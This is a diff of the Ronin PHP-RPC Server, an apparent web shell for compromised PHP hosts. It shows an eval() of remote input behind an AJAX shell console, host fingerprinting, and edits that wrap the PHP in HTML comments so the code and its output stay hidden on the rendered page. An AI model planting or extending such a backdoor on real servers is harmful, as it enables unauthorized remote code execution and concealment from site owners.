@@ -1,3 +1,4 @@
+<!--
 <?php
 #
 # Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
@@ -229,7 +230,7 @@ class ConsoleService extends Service
       $code .= ';';
     }
 
-    return eval("return " . $code);
+    return eval('return ' . $code);
   }
 
   function rpc_inspect($params)
@@ -393,25 +394,22 @@ if (isset($_REQUEST['rpc_call']))
   echo("<rpc>{$response}</rpc>");
   exit;
 }
-else
-{
-  echo("<div style=\"display: none;\">--></div>\n</div>\n</html>\n");
-}
 
 ?>
+-->
 
 <html>
   <head>
     <title>Ronin::PHP - AJAX PHP-RPC Console</title>
-    <link rel="stylesheet" type="text/css" href="http://ronin.rubyforge.org/dist/php/rpc/ajax/css/layout.css">
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/base64.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-1.2.6.min.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-ui-personalized-1.5.2.min.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.terminal.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.phprpc.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/ui.js"></script>
+    <link rel="stylesheet" type="text/css" href="ajax/css/layout.css">
+    <script type="text/javascript" src="ajax/js/base64.js"></script>
+    <script type="text/javascript" src="ajax/js/jquery-1.2.6.min.js"></script>
+    <script type="text/javascript" src="ajax/js/jquery-ui-personalized-1.5.2.min.js"></script>
+    <script type="text/javascript" src="ajax/js/jquery.terminal.js"></script>
+    <script type="text/javascript" src="ajax/js/jquery.phprpc.js"></script>
+    <script type="text/javascript" src="ajax/js/ui.js"></script>
 
-    <script type="text/javascript" language="javascript">
+    <script type="text/javascript">
       $(document).ready(function() {
         $("#console_shell").terminal(function(input) {
           shell.exec(input);
@@ -454,14 +452,20 @@ else
 
           <div id="console_fingerprint" class="console_tab">
             <div class="console_dialogue">
+              <!--
 <?php
+  echo(" -->");
+
   $info = fingerprint();
 
   foreach($info as $name => $value)
   {
     echo("<p><strong>" . str_replace('_', ' ', $name) . ":</strong> $value</p>\n");
   }
+
+  echo("<!-- ");
 ?>
+              -->
             </div>
           </div>
         </div>
